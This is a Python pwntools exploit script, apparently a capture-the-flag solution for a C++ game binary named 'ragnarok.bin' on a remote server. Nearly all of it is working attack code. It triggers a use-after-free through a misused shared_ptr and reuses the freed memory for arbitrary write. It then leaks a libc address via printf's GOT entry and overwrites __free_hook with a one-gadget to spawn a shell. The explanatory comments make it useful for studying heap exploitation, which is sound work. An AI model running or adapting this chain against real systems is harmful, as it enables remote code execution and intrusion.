import sys
from pwn import *

def choose(n):
    p.writelineafter('choice :', '1')
    p.writelineafter('figure :', str(n))

def info():
    p.writelineafter('choice :', '2')
    data = p.readuntil('\n@@@')[:-4]
    return data

def money(n):
    p.writelineafter('choice :', '3')

    c = 0
    while c < n:
        p.readuntil('******\n')
        data = p.readuntil('\n***')[:-4].split('\n')
        ch = data[0].replace(' ', '')[0]

        if data[0].count(ch) == 3:
            val = 'i'
        elif data[0].count(ch) == 2:
            if data[2].count(ch) == 3:
                val = 'n'
            else:
                val = 'h'
        elif data[0].count(ch) == 4:
            if data[1].count(ch) == 2:
                val = 'o'
            else:
                val = 'c'
        elif data[0].count(ch) == 7:
            val = 't'

        p.writelineafter('Magic :', val)
        c += 100

    p.writelineafter('Magic :', 'q')

def weapon():
    p.writelineafter('choice :', '4')
    p.writeline('Gungnir')

def fight(win=True, end=False):
    print 'fight'
    p.writelineafter('choice :', '5')

    p.writelineafter('choice :', '3')
    p.writelineafter('Target :', '1')
    p.readuntil('!\n')

    while 1:
        opts = ['You died', 'You win', '============']
        data = p.readuntil(opts)
        if opts[2] in data:
            p.writelineafter('choice :', '1' if win else '2')
        elif opts[1] in data:
            print 'win'
            if end:
                print '!'*50
                p.interactive()
            p.writeline('A')
            return True
        elif opts[0] in data:
            print 'die'
            p.writeline('1')
            return
        else:
            print 'wtf'

def desc(x):
    p.writelineafter('choice :', '6')
    p.writelineafter('Description :', x)


if 'l' in sys.argv:
    p = process('./ragnarok.bin', env={'LD_PRELOAD':'./libc.so.6:./libvtv.so.0'})
else:
    p = remote('13.114.157.154', 4869)


"""
When add_weapon is called on Odin with "Gungnir", it does
    cast_spell(shared_ptr<Figure>(this))

This creates a new shared_ptr independent of any existing ones.
When the add_weapon function returns, the shared_ptr goes out of
scope and `this` gets freed.
"""

# get enough money to call add_weapon
choose(2)
money(300)
while not fight():
    choose(2)
    money(300)

# lose a fight so we can reselect
fight(False)

# select Odin
choose(1)

# trigger the bug -- free the object
weapon()

"""
Now that the character object is free, the next allocation of
a similar size will overlap its memory.  We call `change_descript`
which allocates a std::string of the size we enter, then assigns it
to character's internal std::string variable.

Because the allocation overlaps, when the copy constructor is called
on the std::string for the description, we control the destination
std::string's memory and get arbitrary write.
"""

pl = ''

# offset of global character object
# set to zero so that we don't get errors about the overwritten vtable
pl += p64(0)
pl += p64(0)

# offset of the global `name` std::string
# set it to point to printf's got entry
pl += p64(0x610e50)
pl += p64(8)
pl += p64(0)

# offset of description std::string in character object --
# we set this to point to the global character object
# in the data section
pl += p64(0x613650)

# money
pl += p32(0x59595959)

# highest money
pl += p32(0x58585858)

pl = pl.ljust(0x78, '\xaa')
desc(pl)

# info command to print out global name, leaking printf
p.writelineafter('choice :', '2')
p.readuntil('Name : ')

leak = p.readline()[:8]
leak = u64(leak.ljust(8, '\0'))
libc = leak - 0x5cd90


"""
Now that we have a leak, use the UAF again to overwrite __free__hook in
libc with a one gadget win.
"""

# potential one gadget wins
#wing = 0x47c9a
#wing = 0xfcc6e
#wing = 0xfdb1e
#wing = 0xd9703
#wing = 0xd99d1
wing = 0xd99dc

# malloc/free hook
#hook = 0x3dac10 # malloc
hook = 0x3dc8a8 # free

print '!'*50
print 'leak:', hex(leak)
print 'libc:', hex(libc)
print 'hook:', hex(libc+hook)
print 'win:', hex(libc+wing)
print '!'*50

# since we overwrote the global character pointer with NULL, we get to
# choose a new one
choose(1)

# free it again for the UAF
weapon()


if 'g' in sys.argv:
    gdb.attach(p, 'b *0x%x' % (libc+wing))

# trigger the UAF again
pl = ''
pl += p64(libc+wing) # write value
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(0)
pl += p64(libc + hook) # write location
pl = pl.ljust(0x78, '\xaa')
desc(pl)

# free hook gets called before anything else happens, giving us a shell
p.interactive()



